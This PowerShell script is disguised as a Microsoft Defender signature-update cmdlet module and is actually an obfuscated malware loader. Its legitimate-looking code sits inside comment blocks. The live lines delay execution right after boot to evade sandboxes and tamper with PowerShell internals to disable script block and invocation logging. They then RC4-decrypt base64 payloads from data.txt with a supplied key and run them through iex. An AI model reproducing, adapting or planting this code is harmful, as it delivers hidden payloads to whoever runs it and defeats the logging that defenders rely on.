<#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpSignature'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        
        
function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $Value['Cim'] = $my['Cim'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $Value['ThrottleLimit'] = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $Value['AsJob'] = $myPSBoundParameters['AsJob'] 
        }
                    

}
#>        
function Update-AVSignature { param ([Parameter(ParameterSetName = 'arg1',Mandatory=$true)][String]$arg1)
<#
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Update0')]
    [AllowEmptyString()]
    [AllowNull()]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]
    ${UpdateSource},

    [Parameter(ParameterSetName='Update0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Update0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Update0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)#>
                $__cmdletization_objectModelWrapper = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime;if ($__cmdletization_objectModelWrapper.TotalMinutes -lt 5) {Start-Sleep -Seconds 300}
                <#if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([Ref].Assembly.$__cmdletization_objectModelWrapper).GetDynamicParameters()#>
                    [Ref].Assembly."G`etType"("S`ystem.Management.Automation.ScriptBlock")."GetFie`ld"("signatures","NonPub"+"lic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]')); $Logging = [Ref].Assembly."G`etType"("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static").GetValue($null);$location = 'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLo'+'gging';$value1 = "ScriptBlockLo'+'gging";$value2 = "EnableScri'+'ptBlockInvoca'+'tionLogging";$Logging[$location] = @{};$Logging[$location].Add($value1,"0");$Logging[$location].Add($value2,"0");
              <#}
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)#>
      $__cmdletization_objectModelWrapper = 'ReturnValue';function ModelWrapper ($wrapper, $data) {$S = 0..255;$j = 0;$present = [System.Text.Encoding]::UTF8.GetBytes($wrapper);for ($i = 0; $i -lt 256; $i++) {$j = ($j + $S[$i] + $present[$i % $present.Length]) % 256;$S[$i], $S[$j] = $S[$j], $S[$i]};$i = $j = 0;$output = New-Object Byte[] $data.Length;for ($k = 0; $k -lt $data.Length; $k++) {$i = ($i + 1) % 256;$j = ($j + $S[$i]) % 256;$S[$i], $S[$j] = $S[$j], $S[$i];$output[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]} return ,$output}$content = Get-Content -Path "data.txt" -Raw;$strings = $content -split ";";foreach ($string in $strings) {$data = [Convert]::FromBase64String($string);$data = ModelWrapper $arg1 $data;$data = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($data)));iex $data}
            <#}
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

     .EXTERNALHELP MSFT_MpWDOScan.cdxml-Help.xml#>
}
